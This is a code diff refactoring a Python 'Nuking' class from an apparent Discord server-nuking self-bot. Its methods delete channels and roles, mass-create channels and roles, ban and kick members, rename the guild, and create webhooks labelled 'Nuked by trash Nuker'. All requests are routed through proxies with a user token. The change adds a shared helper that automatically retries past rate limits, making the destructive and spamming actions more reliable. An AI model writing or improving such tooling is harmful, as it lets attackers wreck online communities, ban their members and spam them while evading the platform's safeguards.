@@ -8,179 +8,111 @@ class Nuking:
         # Get headers directly from Tools (now optimized for Self-bot)
         self.headers = {**Tools.auth_headers(token), "X-Audit-Log-Reason": "Trash Nuker"}
         self.guild, self.token = guild_id, token
+
+    @staticmethod
+    def _ok(status_code: int, allowed=(200, 201, 204)) -> bool:
+        return status_code in allowed
+
+    def _request(self, method: str, url: str, *, json_payload=None, max_retries: int = 3):
+        for _ in range(max_retries + 1):
+            try:
+                r = req.request(
+                    method,
+                    url,
+                    headers=self.headers,
+                    json=json_payload,
+                    proxies=Tools.proxy(),
+                    timeout=15,
+                )
+            except req.RequestException:
+                return None
+
+            if r.status_code == 429:
+                try:
+                    time.sleep(float(r.json().get("retry_after", 1)))
+                except Exception:
+                    time.sleep(1)
+                continue
+            return r
+        return None
     
     def delete_channel(self, channel_id: str):
-        try:
-            url = Tools.api("/channels/%s" % channel_id)
-            r = req.delete(url, headers=self.headers, proxies=Tools.proxy())
-
-            if r.status_code == 200:
-                return True
-            else:
-                if r.status_code == 429:
-                    try:
-                        time.sleep(r.json()["retry_after"])
-                        return self.delete_channel(channel_id)
-
-                    except Exception as err: 
-                        print(err)
-                        return False
-                return False
-        except: return False
+        url = Tools.api("/channels/%s" % channel_id)
+        r = self._request("DELETE", url)
+        return bool(r and self._ok(r.status_code, (200, 204)))
 
 
 
     def create_channel(self, name: str, channel_type: int):
-        try:
-            url = Tools.api("/guilds/%s/channels" % self.guild)
-            payload = {"name": name, "type": channel_type}
-            r = req.post(url, headers=self.headers, json=payload, proxies=Tools.proxy())
-
-            if r.status_code == 201:
-                return r.json()["id"]
-            else:
-                return False
-        except: return False
+        url = Tools.api("/guilds/%s/channels" % self.guild)
+        payload = {"name": name, "type": channel_type}
+        r = self._request("POST", url, json_payload=payload)
+        if r and r.status_code == 201:
+            return r.json().get("id")
+        return False
 
 
     def rename_channel(self, name: str, channel: str):
-        try:
-            url = Tools.api(f"/channels/{channel}")
-            payload = {"name": name }
-
-            r = req.patch(url, json=payload, headers=self.headers)
-            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
-                return True
-            else:
-                return False
-        except: return False
+        url = Tools.api(f"/channels/{channel}")
+        payload = {"name": name}
+        r = self._request("PATCH", url, json_payload=payload)
+        return bool(r and self._ok(r.status_code))
 
 
 
 
     def create_role(self, name: str):
-        try:
-            url = Tools.api("/guilds/%s/roles" % self.guild)
-            payload = {"name": name, "hoist": True, "mentionable": True, "color": random.randint(0, 16777215)}
-            r = req.post(url, headers=self.headers, json=payload, proxies=Tools.proxy())
-
-            if r.status_code == 200:
-                return r.json()["id"]
-            else:
-                return False
-        except: return False
+        url = Tools.api("/guilds/%s/roles" % self.guild)
+        payload = {"name": name, "hoist": True, "mentionable": True, "color": random.randint(0, 16777215)}
+        r = self._request("POST", url, json_payload=payload)
+        if r and r.status_code == 200:
+            return r.json().get("id")
+        return False
 
 
 
 
     def delete_role(self, role_id: str):
-        try:
-            url = Tools.api("/guilds/%s/roles/%s" % (self.guild, role_id))
-            
-            r = req.delete(url, headers=self.headers, proxies= Tools.proxy())
-
-            if r.status_code == 204:
-                return True
-            else: 
-                if r.status_code == 429:
-                    try:
-                        time.sleep(r.json()["retry_after"])
-                        return self.delete_role(role_id)
-
-                    except Exception as err: 
-                        print(err)
-                        return False
-                else:
-                    return False
-        except: return False            
+        url = Tools.api("/guilds/%s/roles/%s" % (self.guild, role_id))
+        r = self._request("DELETE", url)
+        return bool(r and r.status_code == 204)
 
 
     def rename_role(self, role_id: str, name: str):
-        try:
-            url = Tools.api("/guilds/%s/roles/%s" % (self.guild, role_id))
-            payload = {"name": name, "color": random.randint(0, 16777215)}
-
-            r = req.patch(url, headers=self.headers, json=payload,  proxies= Tools.proxy())
-
-            if r.status_code == 204 or r.status_code == 201 or r.status_code == 200:
-                return True
-            else: 
-                if r.status_code == 429:
-                    try:
-                        time.sleep(r.json()["retry_after"])
-                        return self.rename_role(role_id, name)
-
-                    except Exception as err: 
-                        print(err)
-                        return False
-                else:
-                    return False
-        except: return False
+        url = Tools.api("/guilds/%s/roles/%s" % (self.guild, role_id))
+        payload = {"name": name, "color": random.randint(0, 16777215)}
+        r = self._request("PATCH", url, json_payload=payload)
+        return bool(r and self._ok(r.status_code))
 
 
     def ban(self, member_id: str):
-        try:
-            url = Tools.api(f"guilds/{self.guild}/bans/{member_id}")
-            
-            r = req.put(url, headers=self.headers, proxies=Tools.proxy())
-            
-            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
-                return True
-            else:
-                return False
-        except: return False
+        url = Tools.api(f"guilds/{self.guild}/bans/{member_id}")
+        r = self._request("PUT", url)
+        return bool(r and self._ok(r.status_code))
 
 
         
     def unban(self, member_id: str):
-        try:
-            url = Tools.api(f"guilds/{self.guild}/bans/{member_id}")
-            
-            r = req.delete(url, headers=self.headers, proxies=Tools.proxy())
-            
-            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
-                return True
-            else:
-                return False
-        except: return False
+        url = Tools.api(f"guilds/{self.guild}/bans/{member_id}")
+        r = self._request("DELETE", url)
+        return bool(r and self._ok(r.status_code))
         
 
         
     def kick(self, member_id: str):
-        try:
-            url = Tools.api(f"guilds/{self.guild}/members/{member_id}")
-            
-            r = req.delete(url, headers=self.headers, proxies=Tools.proxy())
-
-
-            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
-                return True
-            else:
-                return False
-        except: return False
+        url = Tools.api(f"guilds/{self.guild}/members/{member_id}")
+        r = self._request("DELETE", url)
+        return bool(r and self._ok(r.status_code))
 
 
 
     def create_webhook(self, channel: str):
-        try:
-            url = Tools.api(f"/channels/{channel}/webhooks")
-            payload = {"name": "Nuked by trash Nuker"}
-
-            r = req.post(url, headers=self.headers, json=payload, proxies=Tools.proxy())
-
-            if r.status_code == 200 and "url" in str(r.json()):
-                return r.json()["url"]
-            else:
-                if r.status_code == 429:
-                    try:
-                        time.sleep(r.json()["retry_after"])
-                        return self.create_webhook(channel)
-
-                    except Exception as err: 
-                        print(err)
-                        return False
-                return False
-        except: return False
+        url = Tools.api(f"/channels/{channel}/webhooks")
+        payload = {"name": "Nuked by trash Nuker"}
+        r = self._request("POST", url, json_payload=payload)
+        if r and r.status_code == 200:
+            return r.json().get("url", False)
+        return False
 
 
 
@@ -198,47 +130,22 @@ class Nuking:
         except: pass
 
     def send_message(self, channel: str,message: str):
-        try:
-            url = Tools.api(f"channels/{channel}/messages")
-
-            payload = {
-                "content": message
-
-            }
-
-            r = req.post(url, json=payload, proxies=Tools.proxy(), headers=self.headers)
-
-            if r.status_code == 200:
-                return True
-            else: 
-                return False
-        except: return False        
+        url = Tools.api(f"channels/{channel}/messages")
+        payload = {"content": message}
+        r = self._request("POST", url, json_payload=payload)
+        return bool(r and r.status_code == 200)
     
     def change_nick(self, member_id: str, nick: str):
-        try:
-            url = Tools.api(f"/guilds/{self.guild}/members/{member_id}")
-            paylaod = {"nick": nick}
-
-            r = req.patch(url, json=paylaod, headers=self.headers, proxies=Tools.proxy())
-
-            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
-                return True
-            else:
-                return False
-        except: return False        
+        url = Tools.api(f"/guilds/{self.guild}/members/{member_id}")
+        paylaod = {"nick": nick}
+        r = self._request("PATCH", url, json_payload=paylaod)
+        return bool(r and self._ok(r.status_code))
 
     def rename_guild(self, name: str):
-        try:
-            url = Tools.api(f"/guilds/{self.guild}")
-            payload = {"name": name}
-
-            r = req.patch(url, headers=self.headers, json=payload, proxies=Tools.proxy())
-
-            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
-                return True
-            else:
-                return False
-        except: return False
+        url = Tools.api(f"/guilds/{self.guild}")
+        payload = {"name": name}
+        r = self._request("PATCH", url, json_payload=payload)
+        return bool(r and self._ok(r.status_code))
         
     def change_guild_icon(self, icon_path: str):
         try:
